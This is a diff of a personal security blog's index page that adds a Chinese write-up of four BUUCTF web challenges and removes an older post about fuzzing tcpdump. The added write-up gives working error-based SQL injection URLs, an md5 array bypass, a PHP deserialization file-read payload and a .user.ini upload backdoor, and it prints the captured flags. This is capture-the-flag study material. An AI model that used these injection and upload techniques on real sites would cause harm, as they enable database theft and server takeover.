@@ -73,6 +73,117 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Buuctf Web（25-28）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-12T12:53:48.000Z" itemprop="datePublished">2023-08-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（25-28）"><a href="#Buuctf-Web（25-28）" class="headerlink" title="Buuctf Web（25-28）"></a>Buuctf Web（25-28）</h3><h4 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h4><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名：<code>1</code></p>
+<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
+<p>出现这段话，并且url加上了&#x2F;check.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
+<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
+<p>geek</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
+<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>H4rDsq1</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
+<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>id,username,password</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
+<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>flag{52272770-1ba7-4986-8a7d-cb</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
+<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>7-4986-8a7d-cb84363e2987}</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="26、Ez-bypass"><a href="#26、Ez-bypass" class="headerlink" title="26、Ez_bypass"></a>26、Ez_bypass</h4><p>这是一段php代码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6025af10-9590-4393-a0ae-93aa16f18a7a" alt="image"></p>
+<p>查看源码，得到易读的格式</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3be50c4c-0313-43b5-92a2-760dd9124563" alt="image"></p>
+<p>分析代码</p>
+<p>第一步</p>
+<p>首先用get方式传入id和gg</p>
+<p><code>md5($id)===md5($gg)</code>数组绕过：id[]&#x3D;a&amp;gg[]&#x3D;b，最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p>
+<p>构造payload：<code>/?id[]=a&amp;gg[]=b</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8cce0fe7-5a49-4fef-8dc9-e6bc1d8a1d22" alt="image"></p>
+<p> 第二步</p>
+<p>用post方法传入passwd，passwd不是数字和数字字符串，但是passwd值为1234567</p>
+<p><code>is_numeric() </code>用于检测变量是否为数字或数字字符串</p>
+<p>所以passwd为1234567a</p>
+<p>用插件实现post传参</p>
+<p>构造payload：<code>passwd=1234567a</code></p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b387b0b-34b7-47d7-a4f3-da0541b41645" alt="image"></p>
+<p>关于md5的总结<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52923241/article/details/119669647">【CTF】关于md5总结_ctf md5_吃_早餐的博客-CSDN博客</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e2f8945c-0443-493c-8023-304121617ba8&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="27、AreUSerialz"><a href="#27、AreUSerialz" class="headerlink" title="27、AreUSerialz"></a>27、AreUSerialz</h4><p>代码审计：op变量使用强类型比较&#x3D;&#x3D;&#x3D;判断this-&gt;op的值是否等于字符串2，如果等于，则将其置为1。在process()方法中，使用弱类型比较&#x3D;&#x3D;判断op的值是否对等于字符串2，若为真，则执行read()方法与output()方法。在read()方法中，使用file_get_contents()函数来读取属性filename路径的文件。</p>
+<p>编造序列化（利用public属性序列化，绕过is_valid()函数）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new FileHandler();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到序列化结果为</p>
+<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code><br><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca844239-9ab4-495a-8dca-990e712adf01" alt="image"></p>
+<p>构造payload：<code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/15c04760-6a23-41d4-83f6-dd8f478eb394" alt="image"></p>
+<p>解码后得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5a5854bd-3fac-4eec-b1ea-540fcfeaebae" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0f854947-b236-49a6-ae66-d96e523aa8ca&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="28、CheckIn"><a href="#28、CheckIn" class="headerlink" title="28、CheckIn"></a>28、CheckIn</h4><p>user.ini文件构成PHP后门</p>
+<p>创建<code>.user.ini</code>文件，前面的<code>GIF</code>是为了绕过检测；因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d95f340e-38ae-4031-822c-3f6235148810" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f9af52b5-a67d-4af4-8823-27f73a90f669" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57a89ea6-4ffd-4e14-8ef8-06719fe30248" alt="image"></p>
+<p>创建图片文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/71797466-704f-4582-ba9e-97f28a1b3f74" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8781da91-2795-4230-ac17-57b131e21631" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6c0d5cd1-1472-4e3a-9a9d-da5b8e7d3325" alt="image"></p>
+<p>蚁剑链接<code>http://3b30b477-b314-466c-bb51-8e982490eea3.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php</code></p>
+<p>试了很久返回数据为空，不知道怎么解决</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" data-id="cllavjvho0000t8vf6bgrh8c3" data-title="Buuctf Web（25-28）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Buuctf Web（21-24）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" class="article-date">
@@ -1187,134 +1298,11 @@
 
 
   
-    <article id="post-Exercise 3 - TCPdump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/28/Exercise%203%20-%20TCPdump/" class="article-date">
-  <time class="dt-published" datetime="2023-07-28T15:20:46.000Z" itemprop="datePublished">2023-07-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/28/Exercise%203%20-%20TCPdump/">Exercise 3 - TCPdump</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Exercise-3-TCPdump"><a href="#Exercise-3-TCPdump" class="headerlink" title="Exercise 3 - TCPdump"></a>Exercise 3 - TCPdump</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2017-13028</strong>是一个越界读取漏洞，可以通过BOOTP数据包(引导协议)触发，越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
-<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
-<p>**AddressSanitizer (ASan)**是C和c++的快速内存错误检测器。它最初是由谷歌(Konstantin Serebryany, Derek Bruening, Alexander Potapenko, Dmitry Vyukov)开发的，并于2011年5月首次发布。</p>
-<p>它由编译器插装模块和运行时库组成。该工具能够查找对堆、堆栈和全局对象的越界访问，以及use-after-free、double-free和内存泄漏错误。</p>
-<p>AddressSanitizer是开源的，并且从3.1版开始集成到LLVM编译器工具链中。虽然它最初是作为LLVM的一个项目开发的，但它已被移植到GCC，并包含在GCC版本&gt;&#x3D; 4.8中</p>
-<p>AddressSanitizer（<a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/AddressSanitizer.html%EF%BC%89">https://clang.llvm.org/docs/AddressSanitizer.html）</a></p>
-<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>TCPdump</strong>数据包分析器。目标是在TCPdump 4.9.2中找到<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2017-13028/"><strong>CVE-2017-13028</strong></a>漏洞</p>
-<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
-<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/08529bcf-9f4f-44f8-9b8a-fc8c80dd303f" alt="image"></p>
-<p>下载并解压tcpdump-4.9.2.tar.gz</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bfafe340-fe3e-4521-aa84-99e79d11de50" alt="image"></p>
-<p>下载libpcap（TCPdump需要的一个跨平台库）并解压libpcap-1.8.0.tar.gz</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/981bf9e9-66de-4a6e-b4c3-4327c333682f" alt="image"></p>
-<p>我们需要将“libpcap-libpcap-1.8.0”重命名为“libpcap-1.8.0”。否则，tcpdump找不到libpcap的本地路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv libpcap-libpcap-1.8.0/ libpcap-1.8.0</span><br></pre></td></tr></table></figure>
-
-<p>构建并安装libpcap</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/974188b3-5f85-4f20-a6f2-7dcc627c78c1" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b003c591-59df-4828-95e4-f362af91c420" alt="image"></p>
-<p>构建并安装tcpdump</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/460187ad-7234-43ad-bec8-63e8178e715d" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9eedf66f-4119-400d-bc4d-d58e8b58bf94" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7ebb9a99-b83b-491c-91f4-bdc587c57128" alt="image"></p>
-<p>测试工作是否正常</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -h</span><br></pre></td></tr></table></figure>
-
-<p>看到如下页面说明正常</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/264ba0de-6a31-42f3-9b6f-c7edd627277b" alt="image"></p>
-<p>tcpdump version 4.9.2</p>
-<p>libpcap version 1.8.0</p>
-<p>检查版本号是否与实验手册的一致，若一致，则继续下面的实验</p>
-<h5 id="2、创建种子语料库"><a href="#2、创建种子语料库" class="headerlink" title="2、创建种子语料库"></a>2、创建种子语料库</h5><p>可以在“.pcap”中找到许多. pcap示例，“&#x2F;tests”文件夹中。你可以用下面的命令行运行这些.pcap文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r [.pcap file]</span><br></pre></td></tr></table></figure>
-
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap</span><br></pre></td></tr></table></figure>
-
-<p>然后会看到如下页面</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d9cb8f69-7ae5-42bf-b696-979a1f1486c8" alt="image"></p>
-<h5 id="3、构建时启用ASan"><a href="#3、构建时启用ASan" class="headerlink" title="3、构建时启用ASan"></a>3、构建时启用ASan</h5><p>构建启用了ASAN的tcpdump(和libpcap)</p>
-<p>要清理所有之前编译过的目标文件和可执行文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tcpdump/install</span><br><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3ca726e2-3cf7-4e8d-89eb-a7e5024694b0" alt="image"></p>
-<p>调用configure和make之前设置AFL_USE_ASAN&#x3D;1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73a731ea-8db7-45bb-9120-360aa22920bf" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f83b04a9-8e88-4db5-8164-98e5b97ce159" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/98bb0804-ab9a-41b7-8bba-182e0e0fa707" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5cfcf84a-4ed9-4218-892e-76eec8896e49" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/03482b76-83ce-4a72-9b7a-d5123b3c6d87" alt="image"></p>
-<p>Afl-clang-lto编译可能需要几分钟才能完成</p>
-<h5 id="4、fuzzing"><a href="#4、fuzzing" class="headerlink" title="4、fuzzing"></a>4、fuzzing</h5><p>使用以下命令运行fuzzer</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b93ccc5-cd10-46e8-b67d-a00d8d92e6f7" alt="image"></p>
-<p>注意:64位系统上的ASAN需要大量虚拟内存。这就是为什么我在AFL中设置了禁用内存限制的标志“-m none”</p>
-<p>几小时后可以看见有多个崩溃</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9afc9e90-8010-4369-9714-a521fa4b27c7" alt="image"></p>
-<h5 id="5、Triage"><a href="#5、Triage" class="headerlink" title="5、Triage"></a>5、Triage</h5><p>调试用ASan构建的程序，需要给程序提供崩溃文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r &#x27;/home/fuzz/fuzzing_tcpdump/out/default/crashes/id:000000,sig:06,src:003788,time:8574962,execs:1212760,op:havoc,rep:3&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>可以得到一个很好的奔溃摘要，包括执行跟踪</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86b6892-bc13-46f9-a1c8-7f4372793def" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca42c834-fc39-4701-a80d-18eb4d768d13" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f07ba962-ecff-40d8-9447-c445a1501cee" alt="image"></p>
-<p>报错信息</p>
-<p>AddressSanitizer: heap-buffer-overflow on address 0x6100000000ff at pc 0x0000003cee45 bp 0x7fff77cbed90 sp 0x7fff77cbe538</p>
-<p>堆溢出</p>
-<h5 id="6、修复问题"><a href="#6、修复问题" class="headerlink" title="6、修复问题"></a>6、修复问题</h5><p><a target="_blank" rel="noopener" href="https://github.com/the-tcpdump-group/tcpdump/commit/85078eeaf4bf8fcdc14a4e79b516f92b6ab520fc#diff-05f854a9033643de07f0d0059bc5b98f3b314eeb1e2499ea1057e925e6501ae8L381">https://github.com/the-tcpdump-group/tcpdump/commit/85078eeaf4bf8fcdc14a4e79b516f92b6ab520fc#diff-05f854a9033643de07f0d0059bc5b98f3b314eeb1e2499ea1057e925e6501ae8L381</a></p>
-<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2017-13028</strong>漏洞，了解运行时内存错误检测工具**ASan (Address Sanitizer)**，学会如何使用ASAN模糊目标，使用ASan对崩溃进行分类</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/28/Exercise%203%20-%20TCPdump/" data-id="clkrvnqux0000kkvfc4kx342f" data-title="Exercise 3 - TCPdump" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1338,7 +1326,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 15px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 13.33px;">论文细读</a>
     </div>
   </div>
 
@@ -1360,6 +1348,10 @@
       <ul>
         
           <li>
+            <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
+          </li>
+        
+          <li>
             <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
           </li>
         
@@ -1373,10 +1365,6 @@
         
           <li>
             <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
           </li>
         
       </ul>
